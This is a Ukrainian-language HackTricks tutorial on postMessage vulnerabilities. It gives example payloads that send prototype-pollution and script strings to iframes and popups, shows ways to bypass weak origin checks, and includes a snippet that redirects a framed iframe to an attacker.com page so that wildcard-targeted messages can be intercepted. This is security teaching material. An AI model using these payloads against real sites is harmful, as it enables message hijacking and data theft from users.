# PostMessage –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ

## PostMessage –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS –•–∞–∫—ñ–Ω–≥:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP –•–∞–∫—ñ–Ω–≥: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}


## –ù–∞–¥—ñ—Å–ª–∞—Ç–∏ **PostMessage**

**PostMessage** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –Ω–∞—Å—Ç—É–ø–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **targetOrigin** –º–æ–∂–µ –±—É—Ç–∏ '\*' –∞–±–æ URL, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, _https://company.com._\
–£ **–¥—Ä—É–≥–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó** **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –º–æ–∂–Ω–∞ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ª–∏—à–µ –Ω–∞ —Ü–µ–π –¥–æ–º–µ–Ω** (–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ –≤—ñ–∫–Ω–∞ —ñ–Ω—à–µ).\
–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è **–¥–µ–≤'—è—Ç–∫–∞**, **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –Ω–∞ –±—É–¥—å-—è–∫–∏–π –¥–æ–º–µ–Ω** —ñ –±—É–¥—É—Ç—å –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ –Ω–∞ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ Window.

### –ê—Ç–∞–∫–∞ –Ω–∞ iframe —Ç–∞ –¥–µ–≤'—è—Ç–∫–∞ –≤ **targetOrigin**

–Ø–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Å—Ç–æ—Ä—ñ–Ω–∫—É, —è–∫—É –º–æ–∂–Ω–∞ **–≤—Å—Ç–∞–≤–∏—Ç–∏ –≤ iframe** (–±–µ–∑ –∑–∞—Ö–∏—Å—Ç—É `X-Frame-Header`) —ñ —è–∫–∞ **–Ω–∞–¥—Å–∏–ª–∞—î —á—É—Ç–ª–∏–≤–µ** –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —á–µ—Ä–µ–∑ **postMessage**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **–¥–µ–≤'—è—Ç–∫—É** (\*), –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–º—ñ–Ω–∏—Ç–∏** **–ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è** **iframe** —ñ **–≤–∏–∫—Ä–∏—Ç–∏** **—á—É—Ç–ª–∏–≤–µ** –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –¥–æ–º–µ–Ω, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –≤–∞–º–∏.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ –≤ iframe, –∞–ª–µ **targetOrigin** **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ URL, –∞ –Ω–µ –Ω–∞ –¥–µ–≤'—è—Ç–∫—É**, —Ü–µ–π **—Ç—Ä—é–∫ –Ω–µ —Å–ø—Ä–∞—Ü—é—î**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è addEventListener

**`addEventListener`** - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î JS –¥–ª—è –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ **–æ—á—ñ–∫—É—î `postMessages`**.\
–ë—É–¥—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –∫–æ–¥–∏, –ø–æ–¥—ñ–±–Ω—ñ –¥–æ –Ω–∞–≤–µ–¥–µ–Ω–æ–≥–æ –Ω–∏–∂—á–µ:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–ø–µ—Ä—à–µ, —â–æ** —Ä–æ–±–∏—Ç—å –∫–æ–¥, —Ü–µ **–ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è**. –¶–µ –Ω–∞–¥–∑–≤–∏—á–∞–π–Ω–æ **–≤–∞–∂–ª–∏–≤–æ**, –æ—Å–æ–±–ª–∏–≤–æ —è–∫—â–æ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –∑–±–∏—Ä–∞—î—Ç—å—Å—è —Ä–æ–±–∏—Ç–∏ **—â–æ—Å—å —á—É—Ç–ª–∏–≤–µ** –∑ –æ—Ç—Ä–∏–º–∞–Ω–æ—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—å). **–Ø–∫—â–æ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –∑–º—É—Å–∏—Ç–∏ –∂–µ—Ä—Ç–≤ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –¥–∞–Ω—ñ –Ω–∞ —Ü—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏** —ñ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—ñ –∂–µ—Ä—Ç–≤ (–≤ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ).

### –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è

–©–æ–± **–∑–Ω–∞–π—Ç–∏ –æ–±—Ä–æ–±–Ω–∏–∫–∏ –ø–æ–¥—ñ–π** –Ω–∞ –ø–æ—Ç–æ—á–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ:

* **–®—É–∫–∞—Ç–∏** JS –∫–æ–¥ –¥–ª—è `window.addEventListener` —Ç–∞ `$(window).on` (_–≤–µ—Ä—Å—ñ—è JQuery_)
* **–í–∏–∫–æ–Ω–∞—Ç–∏** –≤ –∫–æ–Ω—Å–æ–ª—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **–ü–µ—Ä–µ–π—Ç–∏ –¥–æ** _Elements --> Event Listeners_ –≤ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞—Ö —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞

![](<../../.gitbook/assets/image (396).png>)

* –í–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –±—Ä–∞—É–∑–µ—Ä–∞** —è–∫ [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) –∞–±–æ [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). –¶—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –±—Ä–∞—É–∑–µ—Ä–∞ **–ø–µ—Ä–µ—Ö–æ–ø–ª—é–≤–∞—Ç–∏–º—É—Ç—å –≤—Å—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è** —ñ –ø–æ–∫–∞–∑—É–≤–∞—Ç–∏–º —ó—Ö –≤–∞–º.

### –û–±—Ö—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è

* –ê—Ç—Ä–∏–±—É—Ç **`event.isTrusted`** –≤–≤–∞–∂–∞—î—Ç—å—Å—è –±–µ–∑–ø–µ—á–Ω–∏–º, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–æ–≤–µ—Ä—Ç–∞—î `True` –ª–∏—à–µ –¥–ª—è –ø–æ–¥—ñ–π, —è–∫—ñ –≥–µ–Ω–µ—Ä—É—é—Ç—å—Å—è —Å–ø—Ä–∞–≤–∂–Ω—ñ–º–∏ –¥—ñ—è–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –•–æ—á–∞ –π–æ–≥–æ –≤–∞–∂–∫–æ –æ–±—ñ–π—Ç–∏, —è–∫—â–æ –≤—ñ–Ω —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –π–æ–≥–æ –∑–Ω–∞—á–µ–Ω–Ω—è –≤ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞—Ö –±–µ–∑–ø–µ–∫–∏ —î –ø–æ–º—ñ—Ç–Ω–∏–º.
* –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`indexOf()`** –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –≤ –ø–æ–¥—ñ—è—Ö PostMessage –º–æ–∂–µ –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ –æ–±—Ö–æ–¥—É. –ü—Ä–∏–∫–ª–∞–¥, —â–æ —ñ–ª—é—Å—Ç—Ä—É—î —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* –ú–µ—Ç–æ–¥ **`search()`** –∑ `String.prototype.search()` –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è —Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –≤–∏—Ä–∞–∑—ñ–≤, –∞ –Ω–µ —Ä—è–¥–∫—ñ–≤. –ü–µ—Ä–µ–¥–∞—á–∞ —á–æ–≥–æ-–Ω–µ–±—É–¥—å, –∫—Ä—ñ–º —Ä–µ–≥—É–ª—è—Ä–Ω–æ–≥–æ –≤–∏—Ä–∞–∑—É, –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –Ω–µ—è–≤–Ω–æ–≥–æ –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è –≤ regex, —â–æ —Ä–æ–±–∏—Ç—å –º–µ—Ç–æ–¥ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–º. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ –≤ regex –∫—Ä–∞–ø–∫–∞ (.) –¥—ñ—î —è–∫ –ø—ñ–¥—Å—Ç–∞–Ω–æ–≤–æ—á–Ω–∏–π –∑–Ω–∞–∫, —â–æ –¥–æ–∑–≤–æ–ª—è—î –æ–±—ñ–π—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –∑ –æ—Å–æ–±–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–µ–Ω–∏–º–∏ –¥–æ–º–µ–Ω–∞–º–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* –§—É–Ω–∫—Ü—ñ—è **`match()`**, –ø–æ–¥—ñ–±–Ω–æ –¥–æ `search()`, –æ–±—Ä–æ–±–ª—è—î regex. –Ø–∫—â–æ regex –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω–∏–π, –≤—ñ–Ω –º–æ–∂–µ –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ –æ–±—Ö–æ–¥—É.
* –§—É–Ω–∫—Ü—ñ—è **`escapeHtml`** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —Å–∞–Ω—ñ—Ç–∞—Ä–Ω–æ—ó –æ–±—Ä–æ–±–∫–∏ –≤–≤–µ–¥–µ–Ω—å —à–ª—è—Ö–æ–º –µ–∫—Ä–∞–Ω—É–≤–∞–Ω–Ω—è —Å–∏–º–≤–æ–ª—ñ–≤. –û–¥–Ω–∞–∫ –≤–æ–Ω–∞ –Ω–µ —Å—Ç–≤–æ—Ä—é—î –Ω–æ–≤–æ–≥–æ –µ–∫—Ä–∞–Ω–æ–≤–∞–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞, –∞ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ —ñ—Å–Ω—É—é—á–æ–≥–æ –æ–±'—î–∫—Ç–∞. –¶—é –ø–æ–≤–µ–¥—ñ–Ω–∫—É –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏. –ó–æ–∫—Ä–µ–º–∞, —è–∫—â–æ –æ–±'—î–∫—Ç –º–æ–∂–Ω–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —Ç–∞–∫, —â–æ –π–æ–≥–æ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∞ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å –Ω–µ –≤–∏–∑–Ω–∞—î `hasOwnProperty`, `escapeHtml` –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ, —è–∫ –æ—á—ñ–∫—É–≤–∞–ª–æ—Å—è. –¶–µ –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–æ–≤–∞–Ω–æ –≤ –Ω–∞–≤–µ–¥–µ–Ω–∏—Ö –Ω–∏–∂—á–µ –ø—Ä–∏–∫–ª–∞–¥–∞—Ö:

* –û—á—ñ–∫—É–≤–∞–Ω–µ –Ω–µ–≤–¥–∞—á–∞:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* –û–±—Ö—ñ–¥ –µ–∫—Ä–∞–Ω—É–≤–∞–Ω–Ω—è:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

–£ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –æ–±'—î–∫—Ç `File` –æ—Å–æ–±–ª–∏–≤–æ –≤—Ä–∞–∑–ª–∏–≤–∏–π —á–µ—Ä–µ–∑ –π–æ–≥–æ —Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `name`. –¶—è –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å, –∫–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ —à–∞–±–ª–æ–Ω–∞—Ö, –Ω–µ —Å–∞–Ω—ñ—Ç–∞—Ä–Ω–æ –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—î—é `escapeHtml`, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏—Ö —Ä–∏–∑–∏–∫—ñ–≤ –±–µ–∑–ø–µ–∫–∏.
* –í–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `document.domain` –≤ JavaScript –º–æ–∂–µ –±—É—Ç–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ —Å–∫—Ä–∏–ø—Ç–æ–º –¥–ª—è —Å–∫–æ—Ä–æ—á–µ–Ω–Ω—è –¥–æ–º–µ–Ω—É, —â–æ –¥–æ–∑–≤–æ–ª—è—î –±—ñ–ª—å—à –º'—è–∫–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–æ–ª—ñ—Ç–∏–∫–∏ –æ–¥–Ω–∞–∫–æ–≤–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –≤ –º–µ–∂–∞—Ö –æ–¥–Ω–æ–≥–æ –±–∞—Ç—å–∫—ñ–≤—Å—å–∫–æ–≥–æ –¥–æ–º–µ–Ω—É.

### e.origin == window.origin –æ–±—Ö—ñ–¥

–ö–æ–ª–∏ –≤–∏ –≤–±—É–¥–æ–≤—É—î—Ç–µ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É –≤ **–ø—ñ—Å–æ—á–Ω–∏—Ü—é iframe** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é %%%%%%, –≤–∞–∂–ª–∏–≤–æ —Ä–æ–∑—É–º—ñ—Ç–∏, —â–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è iframe –±—É–¥–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ null. –¶–µ –æ—Å–æ–±–ª–∏–≤–æ –≤–∞–∂–ª–∏–≤–æ –ø—Ä–∏ —Ä–æ–±–æ—Ç—ñ –∑ **–∞—Ç—Ä–∏–±—É—Ç–∞–º–∏ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ** —Ç–∞ —ó—Ö –Ω–∞—Å–ª—ñ–¥–∫–∞–º–∏ –¥–ª—è –±–µ–∑–ø–µ–∫–∏ —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ.

–í–∫–∞–∑—É—é—á–∏ **`allow-popups`** –≤ –∞—Ç—Ä–∏–±—É—Ç—ñ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ, –±—É–¥—å-—è–∫–µ –≤—ñ–∫–Ω–æ —Å–ø–ª–∏–≤–∞—é—á–æ–≥–æ –≤—ñ–∫–Ω–∞, –≤—ñ–¥–∫—Ä–∏—Ç–µ –∑—Å–µ—Ä–µ–¥–∏–Ω–∏ iframe, —É—Å–ø–∞–¥–∫–æ–≤—É—î –æ–±–º–µ–∂–µ–Ω–Ω—è –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ —Å–≤–æ–≥–æ –±–∞—Ç—å–∫–∞. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —è–∫—â–æ –∞—Ç—Ä–∏–±—É—Ç **`allow-popups-to-escape-sandbox`** —Ç–∞–∫–æ–∂ –Ω–µ –≤–∫–ª—é—á–µ–Ω–∏–π, –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è —Å–ø–ª–∏–≤–∞—é—á–æ–≥–æ –≤—ñ–∫–Ω–∞ —Ç–∞–∫–æ–∂ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è –≤ `null`, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—é iframe.

–û—Ç–∂–µ, –∫–æ–ª–∏ —Å–ø–ª–∏–≤–∞—é—á–µ –≤—ñ–∫–Ω–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—î—Ç—å—Å—è –∑–∞ —Ü–∏—Ö —É–º–æ–≤ —ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –∑ iframe –¥–æ —Å–ø–ª–∏–≤–∞—é—á–æ–≥–æ –≤—ñ–∫–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`postMessage`**, —è–∫ –≤—ñ–¥–ø—Ä–∞–≤–Ω–∏–∫, —Ç–∞–∫ —ñ –æ—Ç—Ä–∏–º—É–≤–∞—á –º–∞—é—Ç—å —Å–≤–æ—ó –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –≤ `null`. –¶—è —Å–∏—Ç—É–∞—Ü—ñ—è –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é, –¥–µ **`e.origin == window.origin`** –æ—Ü—ñ–Ω—é—î—Ç—å—Å—è —è–∫ —ñ—Å—Ç–∏–Ω–∞ (`null == null`), –æ—Å–∫—ñ–ª—å–∫–∏ —è–∫ iframe, —Ç–∞–∫ —ñ —Å–ø–ª–∏–≤–∞—é—á–µ –≤—ñ–∫–Ω–æ –º–∞—é—Ç—å –æ–¥–Ω–µ –π —Ç–µ —Å–∞–º–µ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è `null`.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó **—á–∏—Ç–∞–π—Ç–µ**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### –û–±—Ö—ñ–¥ e.source

–ú–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞–¥—ñ–π—à–ª–æ –∑ —Ç–æ–≥–æ –∂ –≤—ñ–∫–Ω–∞, –≤ —è–∫–æ–º—É —Å–∫—Ä–∏–ø—Ç —Å–ª—É—Ö–∞—î (–æ—Å–æ–±–ª–∏–≤–æ —Ü—ñ–∫–∞–≤–æ –¥–ª—è **Content Scripts –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω—å –±—Ä–∞—É–∑–µ—Ä–∞**, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –±—É–ª–æ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –∑ —Ç—ñ—î—ó –∂ —Å—Ç–æ—Ä—ñ–Ω–∫–∏):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–∏–º—É—Å–∏—Ç–∏ **`e.source`** –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –±—É—Ç–∏ null, —Å—Ç–≤–æ—Ä–∏–≤—à–∏ **iframe**, —è–∫–∏–π **–Ω–∞–¥—Å–∏–ª–∞—î** **postMessage** —ñ **–≤—ñ–¥—Ä–∞–∑—É –≤–∏–¥–∞–ª—è—î—Ç—å—Å—è**.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó **—á–∏—Ç–∞–π—Ç–µ:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### –û–±—Ö—ñ–¥ –∑–∞–≥–æ–ª–æ–≤–∫–∞ X-Frame

–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—ñ –∞—Ç–∞–∫–∏, —ñ–¥–µ–∞–ª—å–Ω–æ, —â–æ–± –≤–∏ –º–æ–≥–ª–∏ **–≤—Å—Ç–∞–≤–∏—Ç–∏ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É –∂–µ—Ä—Ç–≤–∏** –≤—Å–µ—Ä–µ–¥–∏–Ω—É `iframe`. –ê–ª–µ –¥–µ—è–∫—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏, —Ç–∞–∫—ñ —è–∫ `X-Frame-Header`, –º–æ–∂—É—Ç—å **–∑–∞–ø–æ–±—ñ–≥—Ç–∏** —Ü—ñ–π **–ø–æ–≤–µ–¥—ñ–Ω—Ü—ñ**.\
–£ —Ç–∞–∫–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö –≤–∏ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–µ–Ω—à –ø—Ä–∏—Ö–æ–≤–∞–Ω—É –∞—Ç–∞–∫—É. –í–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–∫—Ä–∏—Ç–∏ –Ω–æ–≤—É –≤–∫–ª–∞–¥–∫—É –¥–ª—è –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –≤–µ–±-–¥–æ–¥–∞—Ç–∫—É —Ç–∞ —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –Ω–∏–º:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
